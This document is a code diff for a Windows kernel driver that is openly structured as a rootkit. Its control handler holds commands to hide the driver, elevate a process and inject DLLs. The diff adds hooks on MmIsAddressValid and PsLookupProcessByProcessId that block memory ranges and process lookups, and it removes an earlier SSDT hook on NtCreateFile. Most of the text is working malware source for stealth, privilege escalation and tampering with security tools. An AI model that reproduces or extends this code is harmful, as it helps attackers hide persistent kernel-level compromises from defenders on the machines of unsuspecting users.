@@ -19,6 +19,9 @@ PDEVICE_OBJECT g_DeviceObject;
 Functions 
 */
 
+static bool g_HasRegisteredCallbacks = false;
+static bool g_HasSetupMemory = false;
+
 VOID MsgClientWorkerRoutine(const char* MSG) {
     debug_print("[++] Called MSGClient.\n");
     MemoryHelper::MSGClient(MSG);
@@ -45,6 +48,8 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
             debug_print("[!] Invalid DriverObject!\n");
             __leave;
         }
+
+        
 
         PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
         if (!entry || !MmIsAddressValid(entry)) {
@@ -79,7 +84,6 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
 /*
 End Of Functions.
 */
-
 namespace Rootkit {
     namespace codes {
         // CTL Codes to communicate with User Mode application.
@@ -113,13 +117,19 @@ namespace Rootkit {
             */
         constexpr ULONG InjectDLL =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x708, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
-        constexpr ULONG TestFile =
+        constexpr ULONG BlockAddress =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x709, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG BlockPIDAccess =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x710, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG DeleteAllHooks =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
         WCHAR DLLName[256];
         WCHAR Path[MAX_PATH];
+        WCHAR Filename[256];
+        ADDRESS_RANGE addressToBlock;
         bool stealth;
     };
 
@@ -156,6 +166,7 @@ namespace Rootkit {
 
         if (stack_irp == nullptr || request == nullptr) {
             // to avoid an explosion (bsod) we will just complete request, if we didnt check for this our computer will crash with the kernel error code bsod. -- im guessing to myself the stop code would be PAGEFAULT_IN_NONPAGED_AREA since we accessing memory that should always be there, but its not.
+            DbgPrint("[!] STACK_IRP OR REQUEST ARE NULLPTR, RETURNING.");
             IoCompleteRequest(Irp, IO_NO_INCREMENT);
             return STATUS_UNSUCCESSFUL;
         }
@@ -172,7 +183,9 @@ namespace Rootkit {
         HANDLE pid = request->process_id;
         WCHAR* DLLName = request->DLLName;
         WCHAR* Path = request->Path;
+        //WCHAR* Filename = request->Filename;
         bool stealth = request->stealth;
+        ADDRESS_RANGE addressToBlock = request->addressToBlock;
         int retval;
         switch (control_code) {
         case codes::HideDriver:
@@ -182,7 +195,6 @@ namespace Rootkit {
                 break;
             }
             HideDriverHandler(DriverObject);
-            debug_print("[+] Driver hiding request processed");
             break;
         case codes::ElevateProcess:
             //status = PsLookupProcessByProcessId(request->process_id, &target_process);
@@ -363,12 +375,31 @@ namespace Rootkit {
                 }
             }
             break;
-        case codes::TestFile:
-            if (KernelUtils::HookSSDTFunction("NtCreateFile", FileUtils::HookedNtCreateFile) == STATUS_SUCCESS) {
-                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] yo did it work");
+        case codes::BlockAddress:
+            status = HookingUtils::HookMmIsAddressValid(addressToBlock);
+            if (status == STATUS_SUCCESS) {
+                DbgPrint("[HOOK-CALLER] MmIsAddressValid Hook has been applied / updated.\n");
+            }
+            if (status == STATUS_INVALID_ADDRESS) {
+                DbgPrint("[HOOK-CALLER-ERROR] MmIsAddressValid Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.");
+            }
+            break;
+        case codes::BlockPIDAccess:
+            status = HookingUtils::HookPsLookupProcessByProcessId(HandleToUlong(pid));
+            if (status == STATUS_SUCCESS) {
+                DbgPrint("[HOOK-CALLER] PsLookupProcessByProcessId Hook has been applied / updated.\n");
+            }
+            if (status == STATUS_INVALID_ADDRESS) {
+                DbgPrint("[HOOK-CALLER-ERROR] PsLookupProcessByProcessId Hook couldn't be applied, STATUS_INVALID_ADDRESS returned.");
+            }
+            break;
+        case codes::DeleteAllHooks:
+            status = HookingUtils::DeleteAllHooks();
+            if (status == STATUS_SUCCESS) {
+                DbgPrint("[HOOK-DELETER] All hooks have been successfully detached and destroyed.\n");
             }
             else {
-                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] whoopsie daisy");
+                DbgPrint("[HOOK-DELETER-ERROR] An error has occured when attempting to delete hooks. | STATUS: %d", status);
             }
             break;
         default:
@@ -384,6 +415,7 @@ namespace Rootkit {
     }
 }
 
+extern "C"
 VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     debug_print("[+] UnloadDriver called.\n");
 
@@ -393,10 +425,14 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     debug_print("[+] Symbolic link deleted.\n");
     // Unregister callbacks
 #ifdef DL
-    Callbacks::UnregisterCallbacks();
+    if (g_HasRegisteredCallbacks) {
+        Callbacks::UnregisterCallbacks();
+    }
 #endif
 #ifdef DL
-    MemoryHelper::CleanupSharedMemory();
+    if (g_HasSetupMemory) {
+        MemoryHelper::CleanupSharedMemory();
+    }
 #endif
     // Delete device object(s)
     PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
@@ -419,6 +455,7 @@ VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
     debug_print("[+] Device object(s) deleted.\n");
 }
 
+extern "C"
 NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
     UNREFERENCED_PARAMETER(registry_path);
 
@@ -452,12 +489,21 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
 
 #ifdef DL // If the driver is loaded via a service and not reflectively, register callbacks.
     NTSTATUS status1 = Callbacks::SetupCallbacks(device_object, symbolic_link);
-    if (status1 == STATUS_UNSUCCESSFUL) { // No callbacks - we unload driver.
-        UnloadDriver(driver_object);
+    if (status1 == STATUS_UNSUCCESSFUL) { // No callbacks.
+        g_HasRegisteredCallbacks = false;
+    }
+    else {
+        g_HasRegisteredCallbacks = true;
     }
 #endif
 #ifdef DL
-    MemoryHelper::SetupSharedMemory();
+    status = MemoryHelper::SetupSharedMemory();
+    if (status == STATUS_UNSUCCESSFUL) {
+        g_HasSetupMemory = false;
+    }
+    else {
+        g_HasSetupMemory = true;
+    }
 #endif
     // Setup IOCTL Comm.
     // Allow us to send small amounts of data between user-mode/kernel-mode
@@ -469,7 +515,7 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Rootkit::device_control;
 
     ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);
-
+    
 #ifdef DL
     driver_object->DriverUnload = UnloadDriver;
     g_DriverObject = driver_object;
@@ -480,6 +526,7 @@ NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
     return status;
 }
 
+extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     debug_print("[+] DriverEntry called\n");
 
